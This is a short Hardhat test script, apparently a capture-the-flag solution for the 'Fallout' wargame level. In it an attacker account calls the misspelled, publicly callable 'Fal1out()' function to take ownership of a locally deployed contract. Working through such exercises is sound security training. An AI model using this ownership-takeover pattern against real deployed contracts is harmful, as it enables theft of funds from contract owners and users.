import { expect } from "chai";
import { ethers } from "hardhat";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";

describe("Fallout contract exploit", () => {
  async function deployFalloutFixture() {
    const [deployer, attacker] = await ethers.getSigners();
    const Fallout = await ethers.getContractFactory("Fallout");
    const fallout = await Fallout.connect(deployer).deploy();
    return { attacker, fallout };
  }

  it("Should set attacker account as new owner", async () => {
    const { attacker, fallout } = await loadFixture(deployFalloutFixture);

    // Call Fal1out() function
    // this will set attacker as the new owner
    await fallout.connect(attacker).Fal1out();

    const newOwner = await fallout.connect(attacker).owner();
    expect(newOwner).to.equal(attacker.address, "New owner not set. Attack failed.");
  });
});
